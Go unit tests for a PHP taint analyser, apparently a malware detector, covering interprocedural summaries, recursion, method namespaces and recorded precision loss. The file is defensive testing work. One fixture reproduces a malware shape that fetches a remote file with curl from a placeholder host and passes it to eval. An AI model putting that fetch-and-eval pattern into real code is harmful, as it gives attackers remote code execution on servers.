package phptaint

import (
	"fmt"
	"sort"
	"strings"
	"testing"
)

func summariesOf(t *testing.T, src string) (summaryTables, []string) {
	t.Helper()
	root, status, reason := parseSource([]byte(src))
	if status != StatusAnalyzed {
		t.Fatalf("parse status %v: %s", status, reason)
	}
	return functionSummaries(collectScope(root))
}

func TestSummaryMarksDirectlyReturningFunction(t *testing.T) {
	got, _ := summariesOf(t, "<?php function g($u) { return file_get_contents($u); }")
	if _, ok := got.funcs["g"]; !ok {
		t.Errorf("funcs = %v, want g marked taint-returning", got.funcs)
	}
}

func TestSummaryPropagatesThroughCallChain(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function a($u) { return file_get_contents($u); }
function b($u) { return a($u); }
function c($u) { $t = b($u); return $t; }`)
	names := make([]string, 0, len(got.funcs))
	for n := range got.funcs {
		names = append(names, n)
	}
	sort.Strings(names)
	want := []string{"a", "b", "c"}
	if len(names) != len(want) {
		t.Fatalf("funcs = %v, want %v", names, want)
	}
	for i := range want {
		if names[i] != want[i] {
			t.Fatalf("funcs = %v, want %v", names, want)
		}
	}
}

func TestSummaryTerminatesOnMutualRecursion(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function p($u) { return q($u); }
function q($u) { return p($u); }`)
	if len(got.funcs) != 0 || len(got.methods) != 0 {
		t.Errorf("funcs = %v, methods = %v, want none: neither function reaches a source", got.funcs, got.methods)
	}
}

func TestSummaryIgnoresFunctionThatOnlyEchoes(t *testing.T) {
	got, _ := summariesOf(t, "<?php function g($u) { echo file_get_contents($u); }")
	if _, ok := got.funcs["g"]; ok {
		t.Errorf("funcs = %v, want g absent: it returns nothing", got.funcs)
	}
}

func TestPrecisionLossIsRecorded(t *testing.T) {
	_, loss := summariesOf(t, "<?php function g() { $n = 'x'; $$n = 1; extract($a); call_user_func($f); }")
	joined := strings.Join(loss, " ")
	for _, want := range []string{"variable-variable", "extract", "dynamic-call"} {
		if !strings.Contains(joined, want) {
			t.Errorf("precision loss = %q, want %q recorded", joined, want)
		}
	}
}

// TestSummaryMarksMotivatingSample reproduces the real malware shape this
// task exists for: the fetch and the sink live in different functions, so
// without a summary for fetchContent the flow from curl_exec to eval is
// invisible to a single-scope analysis.
func TestSummaryMarksMotivatingSample(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function fetchContent($url) { $ch = curl_init($url); return curl_exec($ch); }
$content = fetchContent('http://host/p.txt');
eval('?>' . $content);`)
	if _, ok := got.funcs["fetchcontent"]; !ok {
		t.Errorf("funcs = %v, want fetchcontent marked taint-returning", got.funcs)
	}
}

// TestSummaryPropagatesThroughLongCallChain builds a call chain longer than
// the fixed round cap (16) a call chain could once walk past undetected,
// with dependencies discovered in the worst order (each function calls the
// next, so a caller only learns its callee's summary in the round after the
// callee itself converges). That fixed cap evaded detection on exactly this
// shape once already for the intraprocedural fixpoint; the interprocedural
// one must not repeat it.
func TestSummaryPropagatesThroughLongCallChain(t *testing.T) {
	const n = 21
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < n; i++ {
		fmt.Fprintf(&src, "function f%d($u) { return f%d($u); }\n", i, i+1)
	}
	fmt.Fprintf(&src, "function f%d($u) { return file_get_contents($u); }\n", n)
	got, _ := summariesOf(t, src.String())
	if _, ok := got.funcs["f0"]; !ok {
		t.Errorf("funcs omitted the head of a %d-hop call chain", n+1)
	}
}

// TestSummaryMarksMethodAndPropagatesThroughCall proves methods participate
// in the same interprocedural fixpoint as functions: a method that reaches a
// source is itself summarized, and a plain function calling it through
// $obj->fetch() picks up that taint via the method namespace.
func TestSummaryMarksMethodAndPropagatesThroughCall(t *testing.T) {
	got, _ := summariesOf(t, `<?php
class A {
	function fetch($u) { return curl_exec($u); }
}
function caller($obj, $u) {
	$x = $obj->fetch($u);
	return $x;
}`)
	if _, ok := got.methods["fetch"]; !ok {
		t.Errorf("methods = %v, want A::fetch marked taint-returning", got.methods)
	}
	if _, ok := got.funcs["caller"]; !ok {
		t.Errorf("funcs = %v, want caller tainted via ->fetch()", got.funcs)
	}
}

// TestFunctionAndMethodSameNameDoNotContaminate is the load-bearing
// regression for the namespace-collapse false positive: a method and a
// plain function share the bare name "shared", but only the method reaches
// a source. A third function calls the PLAIN function (not the method) by
// its unqualified name. With a single shared summary map, the method's
// taint would leak into the "shared" key and falsely taint every caller of
// the plain function too; with separate namespaces it must not.
func TestFunctionAndMethodSameNameDoNotContaminate(t *testing.T) {
	got, _ := summariesOf(t, `<?php
class B {
	function shared($u) { return curl_exec($u); }
}
function shared($x) { return $x; }
function callsPlainFunction($x) {
	$y = shared($x);
	return $y;
}`)
	if _, ok := got.methods["shared"]; !ok {
		t.Errorf("methods = %v, want B::shared marked taint-returning", got.methods)
	}
	if _, ok := got.funcs["shared"]; ok {
		t.Errorf("funcs = %v, want plain shared() NOT tainted: it only returns its own argument", got.funcs)
	}
	if _, ok := got.funcs["callsplainfunction"]; ok {
		t.Errorf("funcs = %v, want callsPlainFunction NOT tainted: it calls the plain shared(), not B::shared", got.funcs)
	}
}

// TestAmbiguousMethodNameOmittedAndRecorded covers part (b) of the ambiguity
// ruling: two unrelated classes declaring the same method name must not
// resolve to either one's definition (that would be an arbitrary guess), so
// the name is dropped from the method table entirely and the gap is
// recorded rather than silently favoring whichever class collectScope saw
// first.
func TestAmbiguousMethodNameOmittedAndRecorded(t *testing.T) {
	got, loss := summariesOf(t, `<?php
class C1 { function get($u) { return curl_exec($u); } }
class C2 { function get($u) { return $u; } }`)
	if _, ok := got.methods["get"]; ok {
		t.Errorf("methods = %v, want get omitted: declared by two classes", got.methods)
	}
	joined := strings.Join(loss, " ")
	if !strings.Contains(joined, "ambiguous-method") {
		t.Errorf("precision loss = %q, want ambiguous-method recorded", joined)
	}
}
